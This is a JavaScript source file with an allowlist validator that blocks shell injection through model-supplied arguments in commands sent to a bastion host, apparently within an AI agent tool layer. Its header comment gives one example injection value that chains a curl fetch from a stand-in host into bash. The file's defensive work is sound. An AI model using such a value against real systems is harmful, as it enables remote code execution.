/**
 * QUOXTRUST FND_01M3SGFV (shell-injection class): a strict, ALLOWLIST-based validator for
 * model-supplied values that get interpolated into a shell command string sent to the
 * bastion via callBastion(host, cmd). callBastion ships `cmd` verbatim to the bastion
 * /api/v1/exec endpoint, so any unescaped model-filled field embedded in that string is a
 * shell-injection -> RCE vector on the target host (e.g. path = "/tmp; curl evil|bash #").
 *
 * This is a POSITIVE ALLOWLIST per field KIND (the value must match the kind's pattern in
 * full), never a denylist of "bad characters" — a denylist always misses a metacharacter or
 * encoding someone did not think of (the same discipline as the fleet-read allowlist and
 * server.js's WAZUH_VALIDATORS). None of the patterns admit a shell metacharacter
 * (; | & $ ` ( ) < > \n " ' \ * ? ~ space-for-most), so a value that validates cannot break
 * out of its intended argument position. A field that fails validation must be REFUSED by
 * the caller (return an error, never call bastion) — validation is not sanitisation, we do
 * not try to "clean" the value, we reject it.
 *
 * Kept as a collector-LOCAL lib (not services/shared) on purpose: both consumers
 * (lib/agentTools.js and lib/toolExecutors/system.js) resolve it with a plain relative
 * require inside the flattened /app/lib image layout, so there is no ../../shared dual-path
 * container hazard (the lesson from FND_..SCFP).
 */
const PATTERNS = {
  // A filesystem path: letters, digits, dot, underscore, slash, hyphen. No spaces, no
  // metachars. Covers absolute + relative paths for `du -sh <path>/*`.
  path: /^[A-Za-z0-9._/-]{1,256}$/,
  // A systemd unit name (foo.service, foo@bar.service, a slice/scope). Allows @ : . _ -.
  unit: /^[A-Za-z0-9._@:-]{1,128}$/,
  // journalctl priority: a level name (emerg..debug) or a single digit 0-7. Alnum only.
  priority: /^[A-Za-z0-9]{1,12}$/,
  // A journalctl "since" fragment like "1h", "30m", "2 days", "2026-09-30". Alnum, space,
  // colon, underscore, hyphen — no quote/`$`/backtick so it cannot break out of the
  // surrounding double quotes in `--since "<since> ago"`.
  since: /^[A-Za-z0-9 :_-]{1,32}$/,
  // A unix username for `crontab -u <user>`.
  user: /^[A-Za-z0-9._-]{1,64}$/,
  // A docker container name or id. Must start alnum; then the docker-legal name/id charset.
  container: /^[A-Za-z0-9][A-Za-z0-9._-]{0,127}$/,
  // A hostname, domain, or IP literal — for ping/traceroute/dig/openssl targets and pve node
  // names. Letters, digits, dot, hyphen (and _ for some internal names). No metachars, no
  // slash/space, so it cannot break out of `openssl -connect <domain>:443` etc. (FND_..SHGH)
  host: /^[A-Za-z0-9]([A-Za-z0-9._-]{0,252})$/,
  // A numeric id (proxmox vmid / clone newid).
  vmid: /^[0-9]{1,10}$/,
  // A DNS record type (A, AAAA, MX, TXT, CNAME, ...).
  dnsrr: /^[A-Za-z][A-Za-z0-9]{0,9}$/,
  // A TCP/UDP port number.
  port: /^[0-9]{1,5}$/,
  // An AEE event type / action (dotted intent, optional wildcard): quox.tool.execute, auth.*.
  eventtype: /^[A-Za-z0-9._*-]{1,64}$/,
  // An org identifier (ULID-ish / slug). Alnum + _ - only.
  orgid: /^[A-Za-z0-9_-]{1,64}$/,
  // A log-search (grep -i) pattern. POSITIVE allowlist of common regex chars that are all
  // safe INSIDE the double quotes the caller wraps it in — deliberately excludes " $ ` \ ; & { }
  // (the only chars that can execute or break out inside a double-quoted shell arg).
  grep: /^[A-Za-z0-9 ._:/@=,^*?+()[\]|<>%!~#-]{1,200}$/,
};

/**
 * True if `value` is safe to interpolate as the given `kind` of shell argument.
 * An ABSENT value (undefined/null/'') is treated as safe: the caller simply omits the
 * optional command fragment. A REQUIRED field's presence is the caller's responsibility to
 * check separately. An unknown kind fails closed (false).
 */
function isSafeShellArg(kind, value) {
  const re = PATTERNS[kind];
  if (!re) return false; // unknown kind -> fail closed
  if (value === undefined || value === null || value === '') return true;
  return re.test(String(value));
}

module.exports = { isSafeShellArg, PATTERNS };
